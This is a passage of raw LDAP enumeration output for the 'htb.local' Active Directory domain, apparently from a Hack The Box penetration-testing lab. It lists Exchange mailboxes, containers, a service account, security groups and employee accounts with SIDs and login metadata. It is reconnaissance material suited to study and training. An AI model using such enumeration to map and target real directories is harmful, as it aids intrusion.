msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 549755813888
mailNickname: HealthMailboxb01ac647a64648d2a5fa21df27058a24
msExchWhenMailboxCreated: 20190919115737.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1
msExchArchiveName: In-Place Archive -HealthMailbox-EXCH01-008

# HealthMailbox7108a4e350f84b32a7a90d8e718f78cf, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox7108a4e350f84b32a7a90d8e718f78cf,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf
distinguishedName: CN=HealthMailbox7108a4e350f84b32a7a90d8e718f78cf,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919115748.0Z
whenChanged: 20190919115758.0Z
displayName: HealthMailbox-EXCH01-009
uSNCreated: 25265
uSNChanged: 25282
proxyAddresses: SMTP:HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
proxyAddresses: SIP:HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
garbageCollPeriod: 1209600
name: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf
objectGUID:: O5+lKygx90ON7d6ZExw9MA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132133678682533414
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPdwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: HealthMailbox7108a4e
sAMAccountType: 805306368
showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Addre
 ss Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=dcd99265300d4323b2dfb93b20be96a1-Healt
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
mail: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
msExchVersion: 88218628259840
msExchArchiveGUID:: jXTBQpptqkuDNQucSpB0DQ==
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchArchiveDatabaseLink: CN=Mailbox Database 1118319013,CN=Databases,CN=Exch
 ange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First
  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=lo
 cal
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAABAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchPoliciesExcluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 2
msExchMailboxTemplateLink: CN=Default MRM Policy,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: +0+7Mv2Lhky1RFW2tRQx9Q==
msExchTextMessagingState: 302120705
msExchTextMessagingState: 16842751
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
protocolSettings:: UmVtb3RlUG93ZXJTaGVsbMKnMQ==
msExchUMDtmfMap: emailAddress:432584624526971082433503842322729038371837823
msExchUMDtmfMap: lastNameFirstName:4325846245269392401009
msExchUMDtmfMap: firstNameLastName:4325846245269392401009
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 0
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
mDBUseDefaults: TRUE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 549755813888
mailNickname: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf
msExchWhenMailboxCreated: 20190919115748.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1
msExchArchiveName: In-Place Archive -HealthMailbox-EXCH01-009

# HealthMailbox0659cc188f4c4f9f978f6c2142c4181e, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox0659cc188f4c4f9f978f6c2142c4181e,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e
distinguishedName: CN=HealthMailbox0659cc188f4c4f9f978f6c2142c4181e,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919115758.0Z
whenChanged: 20190919115809.0Z
displayName: HealthMailbox-EXCH01-010
uSNCreated: 25277
uSNChanged: 25284
proxyAddresses: SMTP:HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
proxyAddresses: SIP:HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
garbageCollPeriod: 1209600
name: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e
objectGUID:: mSRT4uYHhkyfO5VVkV+oIA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132133678786439938
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPeAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: HealthMailbox0659cc1
sAMAccountType: 805306368
showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Addre
 ss Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=a1dc6736d3f44f68a4d46b101758b583-Healt
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
mail: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
msExchVersion: 88218628259840
msExchArchiveGUID:: f6CK2qKwPEewvovXhfUSVw==
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchArchiveDatabaseLink: CN=Mailbox Database 1118319013,CN=Databases,CN=Exch
 ange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First
  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=lo
 cal
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAABAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchPoliciesExcluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 2
msExchMailboxTemplateLink: CN=Default MRM Policy,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: ICk2wrR8wUeQ7zdnfgmEuQ==
msExchTextMessagingState: 302120705
msExchTextMessagingState: 16842751
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
protocolSettings:: UmVtb3RlUG93ZXJTaGVsbMKnMQ==
msExchUMDtmfMap: emailAddress:432584624526906592218834243939783622142241813
msExchUMDtmfMap: lastNameFirstName:4325846245269392401010
msExchUMDtmfMap: firstNameLastName:4325846245269392401010
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 0
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
mDBUseDefaults: TRUE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 549755813888
mailNickname: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e
msExchWhenMailboxCreated: 20190919115758.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1
msExchArchiveName: In-Place Archive -HealthMailbox-EXCH01-010

# Exchange Install Domain Servers, Microsoft Exchange System Objects, htb.local
dn: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Objects,DC
 =htb,DC=local
objectClass: top
objectClass: group
cn: Exchange Install Domain Servers
description: This group is used during Exchange setup and is not intended to b
 e used for other purposes.
member: CN=EXCH01,CN=Computers,DC=htb,DC=local
distinguishedName: CN=Exchange Install Domain Servers,CN=Microsoft Exchange Sy
 stem Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111135.0Z
whenChanged: 20190919113731.0Z
displayName: Exchange Install Domain Servers
uSNCreated: 24469
memberOf: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=
 local
uSNChanged: 24505
garbageCollPeriod: 1209600
name: Exchange Install Domain Servers
objectGUID:: zxne6Wef+kuCWdt6CE3aKQ==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPbQQAAA==
sAMAccountName: $D31000-NSEL5BRJ63V7
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
msExchProvisioningFlags: 0
internetEncoding: 0
msExchGroupMemberCount: 0
msExchGroupExternalMemberCount: 0
msExchUserAccountControl: 0
msExchBypassAudit: FALSE
msExchAddressBookFlags: 1

# SystemMailbox{ce2583c9-4e38-48ab-b23d-88d6e3aa059f}, Microsoft Exchange Syste
 m Objects, htb.local
dn: CN=SystemMailbox{ce2583c9-4e38-48ab-b23d-88d6e3aa059f},CN=Microsoft Exchan
 ge System Objects,DC=htb,DC=local
objectClass: top
objectClass: msExchSystemMailbox
cn: SystemMailbox{ce2583c9-4e38-48ab-b23d-88d6e3aa059f}
distinguishedName: CN=SystemMailbox{ce2583c9-4e38-48ab-b23d-88d6e3aa059f},CN=M
 icrosoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919114627.0Z
whenChanged: 20190919114627.0Z
displayName: SystemMailbox{ce2583c9-4e38-48ab-b23d-88d6e3aa059f}
uSNCreated: 24804
uSNChanged: 24804
proxyAddresses: SMTP:SystemMailbox{ce2583c9-4e38-48ab-b23d-88d6e3aa059f}@htb.l
 ocal
name: SystemMailbox{ce2583c9-4e38-48ab-b23d-88d6e3aa059f}
objectGUID:: CfzfYj6Tt06JR2VkmP7uiQ==
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=SystemMailbox{ce2583c9-4e38-48ab-b23d-88d6e3aa0
 59f}
objectCategory: CN=ms-Exch-System-Mailbox,CN=Schema,CN=Configuration,DC=htb,DC
 =local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
mail: SystemMailbox{ce2583c9-4e38-48ab-b23d-88d6e3aa059f}@htb.local
msExchVersion: 1130555651391488
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABRIAAAAB
 AQAAAAAABRIAAAAEABwAAQAAAAAAFAADAAIAAQEAAAAAAAUSAAAA
msExchMailboxAuditEnable: FALSE
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
deliveryMechanism: 0
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchMailboxGuid:: tLCAouaCsU2r6CDHqdV+tA==
msExchModerationFlags: 0
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchMailboxFolderSet: 0
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
mailNickname: SystemMailbox{ce2583c9-4e38-48ab-b23d-88d6e3aa059f}
msExchAddressBookFlags: 1

# Program Data, htb.local
dn: CN=Program Data,DC=htb,DC=local
objectClass: top
objectClass: container
cn: Program Data
description: Default location for storage of application data.
distinguishedName: CN=Program Data,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6034
uSNChanged: 94959
showInAdvancedViewOnly: TRUE
name: Program Data
objectGUID:: zrqSHeUoTUOw+deaX/3ZhA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Microsoft, Program Data, htb.local
dn: CN=Microsoft,CN=Program Data,DC=htb,DC=local
objectClass: top
objectClass: container
cn: Microsoft
description: Default location for storage of Microsoft application data.
distinguishedName: CN=Microsoft,CN=Program Data,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6035
uSNChanged: 94962
showInAdvancedViewOnly: TRUE
name: Microsoft
objectGUID:: RRIOQ5TOJEejfjK3gW+IkA==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z

# NTDS Quotas, htb.local
dn: CN=NTDS Quotas,DC=htb,DC=local
objectClass: top
objectClass: msDS-QuotaContainer
cn: NTDS Quotas
description: Quota specifications container
distinguishedName: CN=NTDS Quotas,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6036
uSNChanged: 94965
showInAdvancedViewOnly: TRUE
name: NTDS Quotas
objectGUID:: byVXyhB6BU2xTfTZoBwdfw==
systemFlags: -2147483648
objectCategory: CN=ms-DS-Quota-Container,CN=Schema,CN=Configuration,DC=htb,DC=
 local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
msDS-TombstoneQuotaFactor: 100

# Managed Service Accounts, htb.local
dn: CN=Managed Service Accounts,DC=htb,DC=local
objectClass: top
objectClass: container
cn: Managed Service Accounts
description: Default container for managed service accounts
distinguishedName: CN=Managed Service Accounts,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923225116.0Z
uSNCreated: 6037
uSNChanged: 94968
showInAdvancedViewOnly: FALSE
name: Managed Service Accounts
objectGUID:: XokycPF0i0mTg3gsaSBuLw==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Keys, htb.local
dn: CN=Keys,DC=htb,DC=local

# Service Accounts, htb.local
dn: OU=Service Accounts,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Service Accounts
distinguishedName: OU=Service Accounts,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920004628.0Z
whenChanged: 20190920004628.0Z
uSNCreated: 26069
uSNChanged: 26070
name: Service Accounts
objectGUID:: TpMCEpsIMUmlupVK1IrUkQ==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# svc-alfresco, Service Accounts, htb.local
dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local

# Security Groups, htb.local
dn: OU=Security Groups,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Security Groups
distinguishedName: OU=Security Groups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920010255.0Z
whenChanged: 20190920010255.0Z
uSNCreated: 26093
uSNChanged: 26094
name: Security Groups
objectGUID:: PTyprntFIEu3WxDvAG8CZw==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Service Accounts, Security Groups, htb.local
dn: CN=Service Accounts,OU=Security Groups,DC=htb,DC=local

# Privileged IT Accounts, Security Groups, htb.local
dn: CN=Privileged IT Accounts,OU=Security Groups,DC=htb,DC=local

# test, Security Groups, htb.local
dn: CN=test,OU=Security Groups,DC=htb,DC=local
objectClass: top
objectClass: group
cn: test
distinguishedName: CN=test,OU=Security Groups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190923220852.0Z
whenChanged: 20190923225308.0Z
uSNCreated: 82016
uSNChanged: 109313
name: test
objectGUID:: Y49wAvyEi06j9clFYxXadA==
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNP7RMAAA==
sAMAccountName: test
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Employees, htb.local
dn: OU=Employees,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Employees
distinguishedName: OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190922213836.0Z
whenChanged: 20190922225014.0Z
uSNCreated: 32844
uSNChanged: 32986
name: Employees
objectGUID:: ERus4/A+pkCua21dfrsHxA==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z

# Information Technology, Employees, htb.local
dn: OU=Information Technology,OU=Employees,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Information Technology
distinguishedName: OU=Information Technology,OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920002126.0Z
whenChanged: 20190922213904.0Z
uSNCreated: 25999
uSNChanged: 32848
name: Information Technology
objectGUID:: RP26339EoEubrc+uSS5kEw==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Exchange Administrators, Information Technology, Employees, htb.local
dn: OU=Exchange Administrators,OU=Information Technology,OU=Employees,DC=htb,D
 C=local
objectClass: top
objectClass: organizationalUnit
ou: Exchange Administrators
distinguishedName: OU=Exchange Administrators,OU=Information Technology,OU=Emp
 loyees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920002150.0Z
whenChanged: 20190920004457.0Z
uSNCreated: 26003
uSNChanged: 26062
name: Exchange Administrators
objectGUID:: 48gCOcxc/UmATtzggTxQ1g==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Sebastien Caron, Exchange Administrators, Information Technology, Employees, 
 htb.local
dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
 =Employees,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Sebastien Caron
sn: Caron
givenName: Sebastien
distinguishedName: CN=Sebastien Caron,OU=Exchange Administrators,OU=Informatio
 n Technology,OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920002959.0Z
whenChanged: 20190923220353.0Z
displayName: Sebastien Caron
uSNCreated: 26021
uSNChanged: 81993
name: Sebastien Caron
objectGUID:: FZgcKIpNfUKd9QkF33jQaw==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 132136649695862270
pwdLastSet: 132134129995447247
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPeQQAAA==
accountExpires: 9223372036854775807
logonCount: 8
sAMAccountName: sebastien
sAMAccountType: 805306368
userPrincipalName: sebastien@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132134965694676682

# Developers, Information Technology, Employees, htb.local
dn: OU=Developers,OU=Information Technology,OU=Employees,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Developers
distinguishedName: OU=Developers,OU=Information Technology,OU=Employees,DC=htb
 ,DC=local
instanceType: 4
whenCreated: 20190920002211.0Z
whenChanged: 20190920002211.0Z
uSNCreated: 26007
uSNChanged: 26008
name: Developers
objectGUID:: GXvZmNWtmkmPo7rulxMGsA==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Santi Rodriguez, Developers, Information Technology, Employees, htb.local
dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC
 =htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Santi Rodriguez
sn: Rodriguez
givenName: Santi
distinguishedName: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,
 OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920230255.0Z
whenChanged: 20190920230255.0Z
displayName: Santi Rodriguez
uSNCreated: 28837
uSNChanged: 28843
name: Santi Rodriguez
objectGUID:: VSlmUT29FkGHUAJ12EnggA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132134941751348277
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPgAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: santi
sAMAccountType: 805306368
userPrincipalName: santi@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Application Support, Information Technology, Employees, htb.local
dn: OU=Application Support,OU=Information Technology,OU=Employees,DC=htb,DC=lo
 cal
objectClass: top
objectClass: organizationalUnit
ou: Application Support
distinguishedName: OU=Application Support,OU=Information Technology,OU=Employe
 es,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920002228.0Z
whenChanged: 20190920002236.0Z
uSNCreated: 26009
uSNChanged: 26011
name: Application Support
objectGUID:: hDjlRpQyFkC/nbsQJRP8pA==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# IT Management, Information Technology, Employees, htb.local
dn: OU=IT Management,OU=Information Technology,OU=Employees,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: IT Management
distinguishedName: OU=IT Management,OU=Information Technology,OU=Employees,DC=
 htb,DC=local
instanceType: 4
whenCreated: 20190920004446.0Z
whenChanged: 20190920004447.0Z
uSNCreated: 26060
uSNChanged: 26061
name: IT Management
objectGUID:: VWQ4MgdgsU2fp9NoZJtQ+g==
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 cal
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Lucinda Berger, IT Management, Information Technology, Employees, htb.local
dn: CN=Lucinda Berger,OU=IT Management,OU=Information Technology,OU=Employees,
 DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Lucinda Berger
sn: Berger
givenName: Lucinda
distinguishedName: CN=Lucinda Berger,OU=IT Management,OU=Information Technolog
 y,OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920004413.0Z
whenChanged: 20190920004555.0Z
displayName: Lucinda Berger
uSNCreated: 26053
uSNChanged: 26068
name: Lucinda Berger
objectGUID:: q9GHrGm870ePu/gGNSN5uQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132134138532338911
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPegQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: lucinda
sAMAccountType: 805306368
userPrincipalName: lucinda@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 20201229124641.0Z
dSCorePropagationData: 16010101000000.0Z

# Helpdesk, Information Technology, Employees, htb.local
dn: OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Helpdesk
